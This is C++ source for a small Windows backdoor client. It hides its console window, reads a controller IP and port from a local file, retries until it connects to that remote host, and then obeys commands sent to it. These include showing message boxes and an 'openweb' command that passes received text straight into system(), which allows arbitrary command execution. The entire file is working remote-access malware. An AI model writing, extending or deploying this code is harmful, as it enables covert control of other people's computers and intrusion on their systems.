#include <iostream>
#include <winsock2.h>
#include <fstream>
using namespace std;

#define PK_SIZE 1026
HWND hwnd;
char IP[PK_SIZE]={0};
int PORT;

int main(){
	hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);
	ifstream ifs;
	ifs.open("get.txt");
	if(ifs.is_open()) ifs >> IP >> PORT;
	ifs.close();
	
WSADATA wsa;
WSAStartup(MAKEWORD(2,2),&wsa);

SOCKET skt;
skt = socket(PF_INET,SOCK_STREAM,IPPROTO_TCP);

SOCKADDR_IN addr={0};
addr.sin_family = AF_INET;
addr.sin_port = htons(PORT);
addr.sin_addr.s_addr = inet_addr(IP);

while(1){
if(!connect(skt,(SOCKADDR*)&addr,sizeof(addr))) break;
}

char recve[PK_SIZE]={0},title[PK_SIZE]={0},sub[PK_SIZE]={0};

while(1){
	ZeroMemory(&recve,PK_SIZE);
	ZeroMemory(&title,PK_SIZE);
	ZeroMemory(&sub,PK_SIZE);
	recv(skt, recve, PK_SIZE, 0);
	if(!strcmp(recve,"exit")){
	break;
	}
	else if(!strcmp(recve,"msgbox")){
	recv(skt, title, PK_SIZE, 0);
	recv(skt, sub, PK_SIZE, 0);
	MessageBox(0,sub,title,MB_OK);
	}
	else if(!strcmp(recve,"openweb")){
	recv(skt, sub, PK_SIZE, 0);
	sprintf(title,"start %s",sub);
	system(title);
	}
	else if(!strcmp(recve,"showconsole")){
	recv(skt, sub, PK_SIZE, 0);
	if(!strcmp(sub,"true")){
	hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_SHOW);	
	}
	else if(!strcmp(sub,"false")){
	hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);
	}
	}
}

closesocket(skt);
WSACleanup();
}
